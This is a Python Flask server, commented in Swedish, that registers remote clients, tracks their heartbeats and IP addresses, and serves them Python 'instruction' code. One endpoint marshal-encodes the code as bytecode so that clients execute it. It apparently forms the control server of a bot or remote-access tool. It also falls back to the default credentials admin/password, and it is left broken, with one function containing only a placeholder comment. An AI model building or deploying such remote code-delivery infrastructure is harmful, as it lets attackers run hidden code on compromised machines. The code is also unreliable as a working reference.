#!/usr/bin/python
import os
import sys
import json
import logging
import threading
import time
import shutil
import traceback
import marshal
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template, redirect, url_for, session, send_file
from flask_cors import CORS
import zipfile
from io import BytesIO
import textwrap

# Import instructions for clients
from instructions import INSTRUCTIONS

# Base directory setup
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOG_DIRECTORY = os.path.join(BASE_DIR, "data", "logs")
CLIENT_LOGS_DIRECTORY = os.path.join(LOG_DIRECTORY, "clients")
STATIC_DIRECTORY = os.path.join(BASE_DIR, "static")
TEMPLATES_DIRECTORY = os.path.join(BASE_DIR, "templates")
CONFIG_DIRECTORY = os.path.join(BASE_DIR, "config")
INDEX_FILE = os.path.join(LOG_DIRECTORY, "client_index.json")
PING_STATUS_FILE = os.path.join(LOG_DIRECTORY, "ping_status.json")
ADMIN_CREDENTIALS_FILE = os.path.join(CONFIG_DIRECTORY, "admin_credentials.json")
ALL_IN_LOG_FILE = os.path.join(LOG_DIRECTORY, "allin.log")

# Constants
ONLINE_THRESHOLD_MINUTES = 5
AUTO_PING_INTERVAL = 60  # seconds

# Initialize the Flask application
app = Flask(__name__, 
            static_url_path='/static', 
            static_folder=STATIC_DIRECTORY,
            template_folder=TEMPLATES_DIRECTORY)
CORS(app)

# Session key for Flask
app.secret_key = os.urandom(24)

# Ensure log directories exist
os.makedirs(LOG_DIRECTORY, exist_ok=True)
os.makedirs(CLIENT_LOGS_DIRECTORY, exist_ok=True)

# Setup logging - Regular application logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOG_DIRECTORY, "server.log")),
        logging.StreamHandler(sys.stdout)
    ]
)

# Setup detailed all-in-one logging for client communications
allin_logger = logging.getLogger('allin')
allin_logger.setLevel(logging.DEBUG)

# Create a file handler for the all-in-one logger
allin_handler = logging.FileHandler(ALL_IN_LOG_FILE)
allin_handler.setLevel(logging.DEBUG)
allin_formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s')
allin_handler.setFormatter(allin_formatter)
allin_logger.addHandler(allin_handler)

# Global variables for auto-ping thread
auto_ping_thread = None
auto_ping_running = False

def log_client_communication(direction, client_id, endpoint, data, status_code=None):
    """Log detailed client communication data to allin.log"""
    try:
        log_message = f"DIRECTION: {direction} | "
        log_message += f"CLIENT: {client_id} | "
        log_message += f"ENDPOINT: {endpoint} | "
        
        if status_code is not None:
            log_message += f"STATUS: {status_code} | "
        
        if data:
            if isinstance(data, bytes):
                log_message += f"DATA: [Binary data of length {len(data)}]"
            elif isinstance(data, dict) or isinstance(data, list):
                try:
                    log_message += f"DATA: {json.dumps(data)}"
                except:
                    log_message += f"DATA: {str(data)} (JSON serialization failed)"
            else:
                log_message += f"DATA: {str(data)}"
        else:
            log_message += "DATA: None"
            
        allin_logger.debug(log_message)
    except Exception as e:
        allin_logger.error(f"Error in logging client communication: {str(e)}")
        allin_logger.debug(traceback.format_exc())

def get_admin_credentials():
    """Hämtar admin-inloggningsuppgifter."""
    try:
        if os.path.exists(ADMIN_CREDENTIALS_FILE):
            with open(ADMIN_CREDENTIALS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                return data.get("username"), data.get("password")
        else:
            # Default credentials if no file exists
            return "admin", "password"
    except Exception as e:
        logging.error(f"Fel vid hämtning av admininloggningsuppgifter: {e}")
        return "admin", "password"  # Default if error

def set_admin_credentials(username, password):
    """Sparar nya adminuppgifter."""
    logging.debug(f"Sätter adminuppgifter för användare: {username}")
    try:
        os.makedirs(os.path.dirname(ADMIN_CREDENTIALS_FILE), exist_ok=True)
        with open(ADMIN_CREDENTIALS_FILE, "w", encoding="utf-8") as f:
            json.dump({"username": username, "password": password}, f, indent=4)
        logging.info(f"Adminuppgifter uppdaterade framgångsrikt för användare: {username}")
        return True
    except Exception as e:
        logging.error(f"Fel vid sparande av adminuppgifter: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        return False

def is_client_active(last_activity_str):
    """Kontrollerar om en klient är aktiv baserat på senaste aktivitet."""
    try:
        if not last_activity_str:
            return False
        
        last_activity = datetime.strptime(last_activity_str, "%Y-%m-%d %H:%M:%S")
        now = datetime.now()
        return (now - last_activity) < timedelta(minutes=ONLINE_THRESHOLD_MINUTES)
    except Exception as e:
        logging.error(f"Fel vid kontroll av klientaktivitet: {e}")
        return False

def update_ping_status(client_id, status):
    """Uppdaterar ping-status för en klient."""
    try:
        client_index = {}
        if os.path.exists(INDEX_FILE):
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f)
                
        if client_id in client_index:
            client_index[client_id]["ping_status"] = status
            client_index[client_id]["last_ping"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            with open(INDEX_FILE, "w", encoding="utf-8") as f:
                json.dump(client_index, f, indent=4)
            logging.debug(f"Uppdaterade pingstatus för klient {client_id} till {status}")
            return True
        return False
    except Exception as e:
        logging.error(f"Fel vid uppdatering av pingstatus: {e}")
        return False

def sort_log_entries(log_content, sort_order="newest"):
    """Sorterar logginlägg efter tidstämpel."""
    try:
        lines = log_content.strip().split("\n")
        sorted_lines = []

        # Analysera och sortera
        for line in lines:
            try:
                timestamp_str = line.split("[")[0].strip()
                datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
                sorted_lines.append((timestamp_str, line))
            except (ValueError, IndexError):
                # Om raden inte har ett giltigt tidsstämplingsformat, lägg den längst ner
                sorted_lines.append(("0001-01-01 00:00:00", line))

        # Sortera efter tidsstämpel
        sorted_lines.sort(key=lambda x: x[0], reverse=(sort_order == "newest"))
        
        return "\n".join([line for _, line in sorted_lines])
    except Exception as e:
        logging.error(f"Fel vid sortering av logginlägg: {e}")
        # Returnera original vid fel
        return log_content

def install_static_files():
    """Installerar statiska filer om de saknas."""
    # ... keep existing code (static files installation functionality)

@app.route("/api/register", methods=["POST"])
def api_register():
    """API för klientregistrering."""
    client_data = {}
    ip_address = request.remote_addr
    
    logging.debug(f"Registreringsförfrågan från {ip_address} med data: {request.get_data(as_text=True)}")
    
    try:
        if request.is_json:
            client_data = request.get_json()
        else:
            # Försök att parsa form data
            client_data = request.form.to_dict()
        
        # Log incoming request details
        log_client_communication("IN", client_data.get("id", "unknown"), 
                                "/api/register", client_data)
        
        # Verifiera nödvändig data
        if not client_data or not client_data.get("id"):
            logging.warning(f"Ogiltig registreringsförfrågan från {ip_address}: Inget ID tillhandahållet")
            return jsonify({"status": "error", "message": "Client ID krävs"}), 400
        
        client_id = client_data.get("id")
        logging.info(f"Registrerar klient {client_id} från IP {ip_address}")
        
        # Säkerställ att loggkataloger finns
        os.makedirs(CLIENT_LOGS_DIRECTORY, exist_ok=True)
        os.makedirs(os.path.dirname(INDEX_FILE), exist_ok=True)
        
        # Läs befintligt index om det finns
        client_index = {}
        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
            try:
                with open(INDEX_FILE, "r", encoding="utf-8") as f:
                    client_index = json.load(f) or {}
            except Exception as e:
                logging.error(f"Fel vid läsning av client_index.json: {e}")
                client_index = {}
        
        # Skapa eller uppdatera klientdata
        if client_id in client_index:
            logging.info(f"Uppdaterar befintlig klient {client_id}")
            # Bevara vissa befintliga värden
            existing_data = client_index[client_id]
            # Uppdatera med ny data
            for key, value in client_data.items():
                # Uppdatera bara specifika fält, behåll annat
                if key not in ["last_activity", "first_seen"]:
                    existing_data[key] = value
            # Uppdatera aktivitetstid
            existing_data["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            existing_data["ip"] = ip_address
        else:
            logging.info(f"Skapar ny klient {client_id}")
            # Lägg till standard och infodata
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            client_data.update({
                "ip": ip_address,
                "first_seen": current_time,
                "last_activity": current_time,
                "instruction": client_data.get("instruction", "standard"),
                "is_active": True
            })
            client_index[client_id] = client_data
        
        # Spara uppdaterat index
        with open(INDEX_FILE, "w", encoding="utf-8") as f:
            json.dump(client_index, f, indent=4)
            
        logging.info(f"Klient {client_id} registrerad framgångsrikt")
        
        # Hämta aktiv instruktion att skicka tillbaka
        instruction_name = client_index[client_id].get("instruction", "standard")
        instruction_code = INSTRUCTIONS.get(instruction_name, INSTRUCTIONS["standard"])
        
        response_data = {
            "status": "success", 
            "message": f"Klient {client_id} registrerad", 
            "instruction": instruction_name,
            "code": instruction_code
        }
        
        # Log the response
        log_client_communication("OUT", client_id, "/api/register", response_data, 200)
        
        return jsonify(response_data)
            
    except Exception as e:
        logging.error(f"Fel vid registrering av klient: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        
        error_response = {
            "status": "error", 
            "message": f"Registreringsfel: {str(e)}"
        }
        
        # Log the error response
        log_client_communication("OUT", client_data.get("id", "unknown"), 
                               "/api/register", error_response, 500)
        
        return jsonify(error_response), 500

@app.route("/api/heartbeat/<client_id>", methods=["POST"])
def api_heartbeat(client_id):
    """API för klientheartbeat."""
    ip_address = request.remote_addr
    logging.debug(f"Heartbeat från klient {client_id} på IP {ip_address}")
    
    try:
        # Log incoming request
        additional_data = {}
        if request.is_json:
            additional_data = request.get_json()
        elif request.form:
            additional_data = request.form.to_dict()
            
        log_client_communication("IN", client_id, f"/api/heartbeat/{client_id}", additional_data)
        
        # Kontrollera om klienten finns, annars returnera fel
        client_index = {}
        if os.path.exists(INDEX_FILE) and not os.path.isdir(INDEX_FILE):
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
        
        if client_id not in client_index:
            logging.warning(f"Heartbeat för okänd klient {client_id}")
            error_response = {"status": "error", "message": "Okänd klient"}
            log_client_communication("OUT", client_id, f"/api/heartbeat/{client_id}", error_response, 404)
            return jsonify(error_response), 404
        
        # Uppdatera senaste aktivitet
        client_index[client_id]["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_index[client_id]["ip"] = ip_address
        
        # Uppdatera andra fält om tillhandahållet
        for key, value in additional_data.items():
            if key not in ["id", "last_activity", "first_seen"]:
                client_index[client_id][key] = value
                
        # Spara uppdaterat index
        with open(INDEX_FILE, "w", encoding="utf-8") as f:
            json.dump(client_index, f, indent=4)
            
        logging.debug(f"Heartbeat uppdaterad för klient {client_id}")
        
        # Hämta aktiv instruktion att skicka tillbaka
        instruction_name = client_index[client_id].get("instruction", "standard")
        instruction_code = INSTRUCTIONS.get(instruction_name, INSTRUCTIONS["standard"])
        
        response_data = {
            "status": "success", 
            "message": "Heartbeat registrerad", 
            "instruction": instruction_name,
            "code": instruction_code
        }
        
        log_client_communication("OUT", client_id, f"/api/heartbeat/{client_id}", response_data, 200)
        
        return jsonify(response_data)
    
    except Exception as e:
        logging.error(f"Fel vid hantering av heartbeat för klient {client_id}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        
        error_response = {"status": "error", "message": f"Heartbeat-fel: {str(e)}"}
        log_client_communication("OUT", client_id, f"/api/heartbeat/{client_id}", error_response, 500)
        
        return jsonify(error_response), 500

@app.route("/get_instructions", methods=["GET"])
def get_instructions():
    """Legacy API för att hämta instruktioner - returnerar marshal-kodad data."""
    client_id = request.args.get("client_id")
    
    if not client_id:
        logging.warning("Förfrågan om instruktioner utan klient-ID")
        return jsonify({"error": "client_id required"}), 400
    
    logging.info(f"Legacy instruktionsförfrågan från klient {client_id}")
    log_client_communication("IN", client_id, "/get_instructions", {"client_id": client_id})
    
    try:
        # Kontrollera om klienten finns
        client_index = {}
        if os.path.exists(INDEX_FILE):
            with open(INDEX_FILE, "r", encoding="utf-8") as f:
                client_index = json.load(f) or {}
        
        instruction_name = "standard"  # Default
        
        if client_id in client_index:
            instruction_name = client_index[client_id].get("instruction", "standard")
            # Uppdatera senaste aktivitet
            client_index[client_id]["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(INDEX_FILE, "w", encoding="utf-8") as f:
                json.dump(client_index, f, indent=4)
        
        # Hämta instruktionskod
        instruction_code = INSTRUCTIONS.get(instruction_name, INSTRUCTIONS["standard"])
        
        # Kompilera Python-kod till bytecode och serialisera med marshal
        # Använd en funktion som wrapper för koden
        wrapped_code = f"def run():\n{textwrap.indent(instruction_code, '    ')}\n\nrun()"
        compiled_code = compile(wrapped_code, f"<{instruction_name}>", "exec")
        marshal_data = marshal.dumps(compiled_code)
        
        logging.info(f"Skickar marshal-kodade instruktioner '{instruction_name}' till klient {client_id}")
        log_client_communication("OUT", client_id, "/get_instructions", 
                              f"Binary marshal data for instruction '{instruction_name}'", 200)
        
        # Returnera raw binary data
        return marshal_data, 200, {"Content-Type": "application/octet-stream"}
        
    except Exception as e:
        logging.error(f"Fel vid hantering av instruktionsförfrågan för klient {client_id}: {e}")
        logging.debug(f"Undantagsdetaljer: {traceback.format_exc()}")
        
        error_response = {"error": str(e)}
        log_client_communication("OUT", client_id, "/get_instructions", error_response, 500)
        
        return jsonify(error_response), 500

# Need to add textwrap import at the top of the file
import textwrap
